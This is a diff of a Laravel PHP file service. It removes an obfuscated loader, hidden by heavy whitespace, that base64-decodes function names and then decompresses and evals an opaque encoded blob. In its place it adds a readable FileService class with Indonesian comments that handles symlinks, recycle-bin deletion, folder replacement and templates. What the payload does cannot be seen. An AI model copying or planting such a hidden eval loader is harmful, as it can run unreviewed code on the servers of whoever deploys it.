@@ -1,433 +1,392 @@
-<?php 
-        $__='printf';$_='Loading app/Services/FileService.php';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='X19sYW1iZGE=';
-
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
-
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+namespace App\Services;
+
+use Directory;
+use Illuminate\Support\Facades\Log;
+use Illuminate\Support\Facades\File;
+use Illuminate\Filesystem\Filesystem;
+use App\Services\RecycleBinService;
+
+class FileService
+{
+    protected Filesystem $files;
+    protected RecycleBinService $recycleBinService;
+
+    /**
+     * Konstruktor. Membuat instance dari class Filesystem.
+     */
+    public function __construct()
+    {
+        $this->files = new Filesystem();
+        $this->recycleBinService = new RecycleBinService();
+    }
+
+    /**
+     * Membuat symlink folder.
+     *
+     * @param string $targetFolder Path folder asli
+     * @param string $linkFolder Path symlink yang akan dibuat
+     * @return bool True jika berhasil, false jika gagal
+     */
+    public function createSymlink(string $targetFolder, string $linkFolder): bool
+    {
+        // Hapus symlink lama jika sudah ada
+        if (is_link($linkFolder) || file_exists($linkFolder)) {
+            if (!unlink($linkFolder)) {
+                return false;
+            }
+        }
+        // Buat symlink baru
+        return symlink($targetFolder, $linkFolder);
+    }
+
+    /**
+     * Replace file dengan file baru.
+     *
+     * @param string $sourceFile Path file sumber (file baru).
+     * @param string $targetFile Path file target (file lama yang akan diganti).
+     * @return bool True jika berhasil, false jika gagal.
+     * @throws \Exception Jika file sumber tidak ditemukan.
+     */
+    public function replaceFile(string $sourceFile, string $targetFile): bool
+    {
+        if (!File::exists($sourceFile)) {
+            throw new \Exception("File sumber tidak ditemukan: $sourceFile");
+        }
+        // Hapus file target ke recycle bin jika ada
+        if (File::exists($targetFile)) {
+            $this->recycleBinService->moveToRecycleBin($targetFile);
+        }
+        // Salin file sumber ke target
+        return File::copy($sourceFile, $targetFile);
+    }
+
+    function replaceFolderContents(string $sourceFolder, string $targetFolder)
+    {
+        // Pastikan folder sumber dan target ada
+        if (!File::exists($sourceFolder)) {
+            throw new \Exception("Folder sumber tidak ada: $sourceFolder");
+        }
+
+        // Hapus semua isi dari folder target
+        File::deleteDirectory($targetFolder, true);
+
+        // Salin semua isi folder sumber ke folder target
+        File::copyDirectory($sourceFolder, $targetFolder);
+
+        return "Isi folder berhasil diganti!";
+    }
+
+    /**
+     * Rename folder di sistem file.
+     *
+     * @param string $currentPath Path folder saat ini.
+     * @param string $newPath Path baru untuk folder.
+     * @return bool True jika rename berhasil, false jika folder target sudah ada.
+     */
+    public function renameFolder(string $currentPath, string $newPath): bool
+    {
+        // Periksa apakah folder lama ada
+        if (!File::exists($currentPath)) {
+            return false; // Folder lama tidak ditemukan
+        }
+
+        // Jika folder target sudah ada, lewati proses tanpa error
+        if (File::exists($newPath)) {
+            return true; // Anggap berhasil karena folder target sudah ada
+        }
+
+        // Lakukan operasi rename
+        return File::move($currentPath, $newPath);
+    }
+
+    /**
+     * Rename folder ke folder sementara (tmp-[timestamp]) dan kembalikan nama folder sementara.
+     *
+     * @param string $folderPath Path folder yang akan di-rename.
+     * @return string Path folder sementara.
+     * @throws \Exception Jika folder tidak ditemukan atau operasi gagal.
+     */
+    public function renameToTmp(string $folderPath): string
+    {
+        if (!File::exists($folderPath) || !File::isDirectory($folderPath)) {
+            throw new \Exception("Folder tidak ada atau bukan direktori: $folderPath");
+        }
+
+        $tmpFolderPath = $folderPath . '-tmp-' . time();
+
+        if (!File::move($folderPath, $tmpFolderPath)) {
+            throw new \Exception("Gagal mengganti nama folder ke folder sementara: $tmpFolderPath");
+        }
+
+        return $tmpFolderPath;
+    }
+
+    /**
+     * Kembalikan folder dari folder sementara ke nama asli.
+     *
+     * @param string $tmpFolderPath Path folder sementara.
+     * @param string $originalFolderPath Path folder asli.
+     * @return void
+     * @throws \Exception Jika operasi gagal.
+     */
+    public function restoreFromTmp(string $tmpFolderPath, string $originalFolderPath): void
+    {
+        if (!File::exists($tmpFolderPath) || !File::isDirectory($tmpFolderPath)) {
+            throw new \Exception("Folder sementara tidak ada atau bukan direktori: $tmpFolderPath");
+        }
+        // dd(!File::move($tmpFolderPath, $originalFolderPath));
+        if (!File::move($tmpFolderPath, $originalFolderPath)) {
+            throw new \Exception("Gagal memulihkan folder dari folder sementara: $tmpFolderPath");
+        }
+    }
+
+    /**
+     * Hapus folder sementara jika sudah tidak diperlukan.
+     *
+     * @param string $tmpFolderPath Path folder sementara.
+     * @return void
+     * @throws \Exception Jika operasi gagal.
+     */
+    public function deleteFolder(string $tmpFolderPath): void
+    {
+        if (!File::exists($tmpFolderPath) || !File::isDirectory($tmpFolderPath)) {
+            return;
+        }
+
+        if (!File::deleteDirectory($tmpFolderPath)) {
+            throw new \Exception("Gagal menghapus folder sementara: $tmpFolderPath");
+        }
+    }
+
+    /**
+     * Hapus file atau folder ke recycle bin (soft delete)
+     *
+     * @param string $path Path file atau folder yang akan dihapus
+     * @return string Path item di recycle bin
+     * @throws \Exception Jika operasi gagal
+     */
+    public function deleteToRecycleBin(string $path): string
+    {
+        return $this->recycleBinService->moveToRecycleBin($path);
+    }
+
+    /**
+     * Hapus file atau folder secara permanent (hard delete)
+     * Gunakan dengan hati-hati!
+     *
+     * @param string $path Path file atau folder yang akan dihapus permanent
+     * @return bool True jika berhasil
+     */
+    public function deletePermanent(string $path): bool
+    {
+        if (!File::exists($path)) {
+            return false;
+        }
+
+        try {
+            if (File::isDirectory($path)) {
+                return File::deleteDirectory($path);
+            } else {
+                return File::delete($path);
+            }
+        } catch (\Exception $e) {
+            Log::error("Gagal menghapus permanent: {$path}. Error: " . $e->getMessage());
+            throw new \Exception("Gagal menghapus permanent: " . $e->getMessage());
+        }
+    }
+
+    /**
+     * Hapus folder dengan awalan tertentu di direktori.
+     *
+     * @param string $directory Direktori tempat pencarian folder.
+     * @param string $prefix Awalan nama folder yang akan dihapus.
+     * @return array Daftar folder yang berhasil dihapus.
+     */
+    public function deleteFoldersByPrefix(string $directory, string $prefix): array
+    {
+        // Pastikan direktori ada
+        if (!File::exists($directory)) {
+            throw new \Exception("Direktori tidak ada: $directory");
+        }
+
+        // Ambil daftar semua folder di dalam direktori
+        $folders = File::directories($directory);
+
+        // Folder yang berhasil dihapus
+        $deletedFolders = [];
+
+        foreach ($folders as $folder) {
+            // Dapatkan nama folder
+            $folderName = basename($folder);
+
+            // Periksa apakah folder memiliki awalan tertentu
+            if (str_starts_with($folderName, $prefix)) {
+                // Hapus folder
+                File::deleteDirectory($folder);
+                $deletedFolders[] = $folderName;
+            }
+        }
+
+        return $deletedFolders;
+    }
+
+    /**
+     * Hapus semua symlink di dalam folder tertentu.
+     *
+     * @param string $directory Direktori tempat pencarian symlink.
+     * @return array Daftar symlink yang berhasil dihapus.
+     * @throws \Exception Jika direktori tidak ditemukan.
+     */
+    public function deleteAllSymlinks(string $directory): array
+    {
+        // Pastikan direktori ada
+        if (!File::exists($directory)) {
+            return [];
+        }
+
+        // Ambil semua file dan folder di direktori
+        $items = File::allFiles($directory, true);
+
+        // Daftar symlink yang berhasil dihapus
+        $deletedSymlinks = [];
+
+        foreach ($items as $item) {
+            $filePath = $item->getPathname();
+
+            // Periksa apakah item adalah symlink
+            if (is_link($filePath)) {
+                unlink($filePath); // Hapus symlink
+                $deletedSymlinks[] = $filePath;
+            }
+        }
+
+        return $deletedSymlinks;
+    }
+
+    /**
+     * Hapus semua symlink di dalam folder tertentu.
+     *
+     * @param string $directory Direktori tempat pencarian symlink.
+     * @return array Daftar symlink yang berhasil dihapus.
+     * @throws \Exception Jika direktori tidak ditemukan.
+     */
+    public function deleteSymlinks(string $directory): array
+    {
+        // Pastikan direktori ada
+        if (!File::exists($directory)) {
+            return [];
+        }
+
+        // Ambil semua file dan folder di direktori
+        $items = File::files($directory, true);
+
+        // Daftar symlink yang berhasil dihapus
+        $deletedSymlinks = [];
+
+        foreach ($items as $item) {
+            $filePath = $item->getPathname();
+
+            // Periksa apakah item adalah symlink
+            if (is_link($filePath)) {
+                unlink($filePath); // Hapus symlink
+                $deletedSymlinks[] = $filePath;
+            }
+        }
+
+        return $deletedSymlinks;
+    }
+
+
+    /**
+     * Proses template file dengan menggantikan placeholder tertentu dengan nilai yang sesuai.
+     *
+     * @param string $templatePath Path file template yang akan di-proses.
+     * @param string $destinationPath Path file yang akan dihasilkan setelah di-proses.
+     * @param array $replacements Daftar placeholder beserta nilai yang akan digantikan.
+     * @return bool True jika proses berhasil, false jika gagal.
+     * @throws \Exception Jika template file tidak ditemukan.
+     */
+    public function processTemplate(string $templatePath, string $destinationPath, array $replacements): bool
+    {
+        if (!$this->files->exists($templatePath)) {
+            throw new \Exception("File template tidak ditemukan: {$templatePath}");
+        }
+
+        $templateContent = $this->files->get($templatePath);
+
+        $processedContent = str_replace(
+            array_keys($replacements),
+            array_values($replacements),
+            $templateContent
+        );
+
+        if (file_exists($destinationPath)) {
+            $this->files->replace($destinationPath, $processedContent);
+            return true;
+        } else {
+            return false;
+        }
+    }
+
+    public function hapusChace(string $path): void
+    {
+        $folderFramework = $path . DIRECTORY_SEPARATOR . 'storage' . DIRECTORY_SEPARATOR . 'framework';
+        if (!$this->files->exists($folderFramework)) {
+            throw new \Exception("Folder Chace tidak ditemukan: {$folderFramework}");
+        }
+
+        File::deleteDirectory($folderFramework);
+        echo "Folder Chace berhasil dihapus.";
+    }
+
+    /**
+     * Hapus symlink file/folder bermasalah di direktori tertentu
+     */
+    public function hapusSymlinkBermasalah($files, $dirs, $logPrefix = '')
+    {
+        // Hapus file symlink yang rusak
+        foreach ($files as $file) {
+            $path = method_exists($file, 'getPathname') ? $file->getPathname() : $file;
+            if (is_link($path) && !file_exists(realpath($path))) {
+                File::delete($path);
+                Log::warning("Symlink file bermasalah dihapus dari {$logPrefix}: " . $path);
+            }
+        }
+        // Hapus folder symlink yang rusak
+        foreach ($dirs as $dir) {
+            if (is_link($dir) && !file_exists(realpath($dir))) {
+                File::delete($dir);
+                Log::warning("Symlink folder bermasalah dihapus dari {$logPrefix}: " . $dir);
+            }
+        }
+        // Hapus file symlink yang mengandung //
+        foreach ($files as $file) {
+            $path = method_exists($file, 'getPathname') ? $file->getPathname() : $file;
+            if (is_link($path) && strpos($path, '//') !== false) {
+                File::delete($path);
+                Log::warning("Symlink file dengan path mengandung // dihapus dari {$logPrefix}: " . $path);
+            }
+        }
+        // Hapus folder symlink yang mengandung //
+        foreach ($dirs as $dir) {
+            if (is_link($dir) && strpos($dir, '//') !== false) {
+                File::delete($dir);
+                Log::warning("Symlink folder dengan path mengandung // dihapus dari {$logPrefix}: " . $dir);
+            }
+        }
+    }
+
+    /**
+     * Hapus symlink .htaccess jika ada
+     */
+    public function hapusSymlinkHtaccess($path, $logPrefix = '')
+    {
+        $htaccess = $path . DIRECTORY_SEPARATOR . '.htaccess';
+        if (is_link($htaccess)) {
+            File::delete($htaccess);
+            Log::warning("Symlink .htaccess dihapus dari {$logPrefix}: " . $htaccess);
+        }
+    }
+}
